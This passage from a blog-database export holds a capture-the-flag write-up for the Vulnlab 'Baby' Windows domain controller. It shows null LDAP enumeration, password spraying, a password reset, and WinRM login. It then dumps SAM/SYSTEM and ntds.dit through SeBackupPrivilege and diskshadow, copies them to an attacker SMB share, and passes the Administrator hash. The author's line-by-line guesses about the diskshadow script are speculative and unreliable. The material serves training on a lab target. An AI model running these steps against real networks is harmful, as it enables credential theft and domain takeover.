class=\"code\"><pre><span class=\"line\">└─$ sudo nmap 10.10.99.70 -A</span><br><span class=\"line\"></span><br><span class=\"line\">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">|   DNS_Computer_Name: BabyDC.baby.vl</span><br><span class=\"line\">| ssl-cert: Subject: commonName=BabyDC.baby.vl</span><br></pre></td></tr></table></figure>\n\n<p>Let’s add these to our <code>/etc/hosts</code> file so we can resolve any future enumeration techniques to the correct DNS name. Furthermore, attempting to authenticate to SMB seems to not return anything in particular.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.99.70 -N</span><br><span class=\"line\">Anonymous login successful</span><br><span class=\"line\"></span><br><span class=\"line\">        Sharename       Type      Comment</span><br><span class=\"line\">        ---------       ----      -------</span><br><span class=\"line\">Reconnecting with SMB1 for workgroup listing.</span><br><span class=\"line\">do_connect: Connection to 10.10.99.70 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class=\"line\">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>\n\n<p>SMB does not seem to be helpful as of right now, so let’s try to focus on LDAP. Normally, it’s an extremely insecure practice to allow null LDAP enumeration. That being said, there’s no harm in trying to run a few queries with LDAP to test for any responses.</p>\n<h1 id=\"LDAP-Enumeration\"><a href=\"#LDAP-Enumeration\" class=\"headerlink\" title=\"LDAP Enumeration\"></a>LDAP Enumeration</h1><p>Let’s first test for null authentication and query LDAP for all domain objects in the domain.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D &#x27;&#x27; -w &#x27;&#x27; -b &quot;DC=baby,DC=vl&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># extended LDIF</span><br><span class=\"line\">#</span><br><span class=\"line\"># LDAPv3</span><br><span class=\"line\"># base &lt;DC=baby,DC=vl&gt; with scope subtree</span><br><span class=\"line\"># filter: (objectclass=*)</span><br><span class=\"line\"># requesting: ALL</span><br><span class=\"line\">#</span><br><span class=\"line\"></span><br><span class=\"line\"># baby.vl</span><br><span class=\"line\">dn: DC=baby,DC=vl</span><br><span class=\"line\"></span><br><span class=\"line\"># Administrator, Users, baby.vl</span><br><span class=\"line\">dn: CN=Administrator,CN=Users,DC=baby,DC=vl</span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>You can see from the result that all of the domain objects were returned, meaning that we are able to query LDAP for essentially any domain object we’d like. If we were on a Windows workstation that was within the domain, we could use tools like <code>ADSearch</code> or <code>PowerView</code> to query for any users, groups, essentially any domain object we’d like.</p>\n<p>Let’s adjust our LDAP search query so we can create a user list.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D &#x27;&#x27; -w &#x27;&#x27; -b &quot;DC=baby,DC=vl&quot; | grep &#x27;@baby.vl&#x27; | awk &#x27;&#123;print $2&#125;&#x27; | cut -d &#x27;@&#x27; -f 1 &gt; ul.txt; cat ul.txt</span><br><span class=\"line\"></span><br><span class=\"line\">Jacqueline.Barnett</span><br><span class=\"line\">Ashley.Webb</span><br><span class=\"line\">Hugh.George</span><br><span class=\"line\">Leonard.Dyer</span><br><span class=\"line\">Connor.Wilkinson</span><br><span class=\"line\">Joseph.Hughes</span><br><span class=\"line\">Kerry.Wilson</span><br><span class=\"line\">Teresa.Bell</span><br></pre></td></tr></table></figure>\n\n<p>I was getting ready to run some tests using this wordlist, but if you do a quick check over the LDAP dump you’ll see that we missed a few users. I wasn’t certain if this was an LDAP issue or a <code>grep</code> issue, but nonetheless I copied the remaining users into the wordlist. (<code>Caroline.Robinson</code> and <code>Ian.Walker</code>)</p>\n<p>You’ll notice at the end of the same full LDAP dump output under <code>Teresa.Bell</code>, there seems to be a description comment that says <code>description: Set initial password to [...snip...</code>.</p>\n<p>We can infer based on the message that this is the initial password for users when they are created. Now that we have a list of users and a potential password, we can use <code>crackmapexec</code> to test if any users have this password still set to their account. We’ll use SMB as our service to test against since we really don’t need to query anything for LDAP anymore (since we can already dump the entire domain with null credentials).</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ for user in $(cat ul.txt); do crackmapexec smb BabyDC.baby.vl -u $user -p &#x27;BabyStart123!&#x27;; done</span><br><span class=\"line\"></span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">SMB         BabyDC.baby.vl  445    BABYDC           [-] baby.vl\\Caroline.Robinson:[...snip...] STATUS_PASSWORD_MUST_CHANGE</span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>You’ll notice that we’ll get a hit on <code>Caroline.Robinson</code>, stating that their password needs to change. This more than likely is notifying us that the user has not done their initial authentication to the domain yet or that they have gone past the password reset policy deadline. This can be the case with new employees and&#x2F;or interns.</p>\n<h1 id=\"Password-Reset-with-SMBPasswd\"><a href=\"#Password-Reset-with-SMBPasswd\" class=\"headerlink\" title=\"Password Reset with SMBPasswd\"></a>Password Reset with SMBPasswd</h1><p>In that case let’s try to reset their password with <code>smbpasswd</code>. The only pre-reqs to this is that we specify the username and the specific remote machine we want to change it for.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smbpasswd -r BabyDC.baby.vl -U BABYDC/&#x27;Caroline.Robinson&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">Old SMB password: ([...snip...])</span><br><span class=\"line\">New SMB password: password123@</span><br><span class=\"line\">Retype new SMB password: password123@</span><br><span class=\"line\">Password changed for user Caroline.Robinson</span><br></pre></td></tr></table></figure>\n\n<p>If we test the same <code>crackmapexec</code> command as above for <code>Caroline.Robinson</code>, we can see that their password was successfully updated. Normally I’d now dump the LDAP with bloodhound to get all of the domain objects into a GUI, but if we test <code>crackmapexec</code> against WinRM we can see that we already are able to login as this user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec winrm BabyDC.baby.vl -u &#x27;Caroline.Robinson&#x27; -p &#x27;password123@&#x27;</span><br><span class=\"line\">SMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)</span><br><span class=\"line\">HTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman</span><br><span class=\"line\">WINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\\Caroline.Robinson:password123@ (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<p>After logging in, you can find the user flag within the user’s Desktop directory.</p>\n<p><img src=\"/images/vulnlab/baby-vl/b.png\" alt=\"image1\" title=\"B\"></p>\n<h1 id=\"Privilege-Escalation-w-SeBackupPrivilege\"><a href=\"#Privilege-Escalation-w-SeBackupPrivilege\" class=\"headerlink\" title=\"Privilege Escalation w&#x2F; SeBackupPrivilege\"></a>Privilege Escalation w&#x2F; SeBackupPrivilege</h1><p>Let’s do a quick privilege to see if there’s anything that we can exploit.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents&gt; whoami /priv</span><br><span class=\"line\"></span><br><span class=\"line\">Privilege Name                Description                    State</span><br><span class=\"line\">============================= ============================== =======</span><br><span class=\"line\">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class=\"line\">SeBackupPrivilege             Back up files and directories  Enabled</span><br><span class=\"line\">SeRestorePrivilege            Restore files and directories  Enabled</span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see from the output that we have <code>SeBackupPrivilege</code> enabled for our user. This essentially means that we can backup various parts of the filesystem. In most cases, this can be for a engineer or technical support user and seems harmless at first glance. However, this means we can also backup sensitive files such as the <code>SAM</code> and <code>SYSTEM</code> databases. These database essentially house user accounts and security objects for all domain objects on the machine. The only issue is that this also houses user passwords, meaning if we dump these databases we can view the password for every user on the machine.</p>\n<p>So first, let’s dump both of these databases into a temporary directory.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents&gt; mkdir C:\\temp</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents&gt; reg save hklm\\sam c:\\temp\\sam</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents&gt; reg save hklm\\system c:\\temp\\system</span><br></pre></td></tr></table></figure>\n\n<p>These files will now be saved to our temporary directory, in which we can download them to our local machine. This machine does have AV enabled so we won’t be able to set up a simple C2 server’s without obfuscating our payloads, meaning we’ll need to find a way to transfer our files back and forth in a inconspicuous manner.</p>\n<p>We can use Impacket’s <code>smbserver</code> to spin up a quick SMB server, to which we can then transfer our files to our Kali machine.</p>\n<figure class=\"highlight plaintext\"><figcaption><span>-> Kali</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ mkdir share/</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-smbserver smb share/ -smb2support</span><br><span class=\"line\"></span><br><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; copy sam \\\\(Kali IP)\\smb\\sam</span><br><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; copy system \\\\(Kali IP)\\smb\\system</span><br></pre></td></tr></table></figure>\n\n<p>You’ll notice a lot of output from our SMB server when we’re copying the files over, this is just a built-in Impacket functionality that will dump the user’s NetNTLM hash when they authenticate to our SMB server. We can ignore this, and if we look at the <code>share/</code> directory we’ll see the two files that we downloaded are in this folder.</p>\n<p>Now that we have both of these files, let’s run <code>samdump</code> on them to retrieve credentials that are within these two databases.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ samdump2 system sam</span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br><span class=\"line\">*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">*disabled* ä:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the Administrator’s hash, let’s test the creds once more with <code>crackmapexec</code> and by passing the hash to it.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec winrm BabyDC.baby.vl -u &#x27;Administrator&#x27; -H &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)</span><br><span class=\"line\">HTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman</span><br><span class=\"line\">WINRM       BabyDC.baby.vl  5985   BABYDC           [-] baby.vl\\Administrator:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>The thing is, this will fail. The Administrator hash above is not an Administrator hash that we can login with. There is a hash of an account with the same username on the DC, meaning we’ll need to look a little further with our <code>SeBackupPrivilege</code> to dump another file.</p>\n<h1 id=\"Diskshadow-Robocopy-for-NTDS-dit\"><a href=\"#Diskshadow-Robocopy-for-NTDS-dit\" class=\"headerlink\" title=\"Diskshadow&#x2F;Robocopy for NTDS.dit\"></a>Diskshadow&#x2F;Robocopy for NTDS.dit</h1><p>The file in particular that we’re looking for is a copy of the <code>C:\\</code>‘s ntds database, which stores Active Directory information of the respective filesystem path. We can use this along with our previously obtained <code>SAM</code> and <code>SYSTEM</code> databases to dump the AD secrets of the domain controller.</p>\n<p>To exploit this, we can use <code>diskshadow</code> and <code>robocopy</code> to create a copy of the current drive and copy the copied filesystem back to the <code>C:\\</code> drive. (Credit goes to Nairuz Abulhul for their explanation of this exploit in their article <a href=\"https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960\">here</a>.)</p>\n<p>Let’s first create a file named <code>script.txt</code> and transfer it to our <code>Evil-WinRM</code> session. The contents of the script can be seen below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">set metadata C:\\Windows\\Temp\\meta.cabX</span><br><span class=\"line\">set context clientaccessibleX</span><br><span class=\"line\">set context persistentX</span><br><span class=\"line\">begin backupX</span><br><span class=\"line\">add volume C: alias cdriveX</span><br><span class=\"line\">createX</span><br><span class=\"line\">expose %cdrive% E:X</span><br><span class=\"line\">end backupX</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li><p><code>set metadata C:\\Windows\\Temp\\meta.cabX</code>: This command is setting metadata for the backup operation. It seems to be specifying the location where metadata related to the backup will be stored, in this case, <code>C:\\Windows\\Temp\\meta.cabX</code>.</p>\n</li>\n<li><p><code>set context clientaccessibleX</code>: This command is setting the context for the backup operation. It seems to be specifying that the backup should be accessible by the client. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>set context persistentX</code>: This command is setting another context for the backup operation. It could be specifying that the backup should be persistent, meaning it should remain available or stored for a certain period. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>begin backupX</code>: This command is initiating the backup operation. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>add volume C: alias cdriveX</code>: This command is adding the volume <code>C:</code> to the backup operation with an alias <code>cdriveX</code>. This means that the contents of the <code>C:</code> drive will be included in the backup. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>createX</code>: This command is creating something related to the backup operation. It’s not entirely clear what it’s creating without more context or additional information about the script.</p>\n</li>\n<li><p><code>expose %cdrive% E:X</code>: This command seems to be exposing the contents of the <code>C:</code> drive, which was added to the backup operation with the alias <code>cdriveX</code>, to a location specified by <code>%cdrive%</code> on drive <code>E:</code>. This might involve mounting the backup or making it accessible in some way. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>end backupX</code>: This command is ending the backup operation. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n</ol>\n<p>Let’s set up a simple Python server so we can curl this script to our WinRM session.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 -m http.server 9001</span><br><span class=\"line\"></span><br><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; curl http://(Kali IP):9001/script.txt -O script.txt</span><br></pre></td></tr></table></figure>\n\n<p>Next, let’s run <code>diskshadow</code> to create a copy of the <code>C:\\</code> drive.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">diskshadow /s script.txt</span><br></pre></td></tr></table></figure>\n\n<p>After the filesystem copy finishes, it will be saved to <code>E:\\Windows</code>. This is where we can use <code>robocopy</code> to move it back to our <code>C:\\</code> drive.</p>\n<p><code>robocopy /b E:\\Windows\\ntds . ntds.dit</code></p>\n<p>Let’s now use our SMB server on our Kali machine to download the <code>ntds.dit</code> file from the WinRM session.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; copy ntds.dit \\\\10.8.0.173\\smb\\ntds.dit</span><br></pre></td></tr></table></figure>\n\n<p>From here, all that’s left to do is retrieve the correct NTLM hashes by dumping the DC secrets with <code>impacket-secretsdump</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br><span class=\"line\">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br></pre></td></tr></table></figure>\n\n<p>This will dump the NTLM hashes for every user that has the ability to login to a service on the domain controller. At the bottom of the output, you’ll find hashes for all of the AD users that we dumped through LDAP at the beginning of this machine.</p>\n<p>Underneath <code>[*] Reading and decrypting hashes from ntds.dit</code>, we’ll find the correct NTLM hash for the Administrator user. We can verify our ability to connect with this using <code>crackmapexec</code> once more.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec winrm BabyDC.baby.vl -u &#x27;Administrator&#x27; -H &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)</span><br><span class=\"line\">HTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman</span><br><span class=\"line\">WINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\\Administrator:[...snip...] (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<p>Thus, we have the ability to log in through WinRM as the Administrator. The root hash can be found within the Administrator’s Desktop directory.</p>\n<p><img src=\"/images/vulnlab/baby-vl/c.png\" alt=\"image2\" title=\"C\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This means we have rooted this machine! Credit goes to xct for the development of this machine. As said previously, this machine is really helpful if you want to learn Active Directory basics.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://lonewolf.my.site.com/s/article/DPN-Reset-Samba-Passwords#:~:text=At%20the%20%23%20prompt%20type%20in,is%20to%20reset%20the%20password.&text=To%20set%20up%20a%20new,will%20ask%20for%20the%20password\">https://lonewolf.my.site.com/s/article/DPN-Reset-Samba-Passwords#:~:text=At%20the%20%23%20prompt%20type%20in,is%20to%20reset%20the%20password.&amp;text=To%20set%20up%20a%20new,will%20ask%20for%20the%20password</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960\">https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960</a></p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"clx0t67qs0001t5uf01d6aobz","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clx0w93qe000367uf5kxwfkcw"}],"PostTag":[{"post_id":"clx0t67qs0001t5uf01d6aobz","tag_id":"clx0u1gtn0002ttuf0136cf17","_id":"clx0u1gtq000dttuf6043ggp4"},{"post_id":"clx0t67qs0001t5uf01d6aobz","tag_id":"clx0w93qc000167uf34i91h69","_id":"clx0w93qe000267ufd26751z7"}],"Tag":[{"name":"Vulnlab","_id":"clx0u1gtm0001ttufeis42sot"},{"name":"Easy","_id":"clx0u1gtn0002ttuf0136cf17"},{"name":"Active Directory","_id":"clx0u1gtn0004ttuf5nfxalw1"},{"name":"Windows","_id":"clx0u1gto0005ttufh6113g6b"},{"name":"LDAP","_id":"clx0u1gto0006ttuf460h7ul9"},{"name":"SMB","_id":"clx0u1gto0007ttufgeez1czm"},{"name":"Bloodhound","_id":"clx0u1gto0008ttufg6gp43n0"},{"name":"Backup Admin","_id":"clx0u1gtp0009ttuf3yx957nq"},{"name":"SeBackupPrivilege","_id":"clx0u1gtp000attufbr1pdttf"},{"name":"Impacket","_id":"clx0u1gtq000bttuf7fhh1hyg"},{"name":"vulnlab","_id":"clx0w93qc000167uf34i91h69"}]}}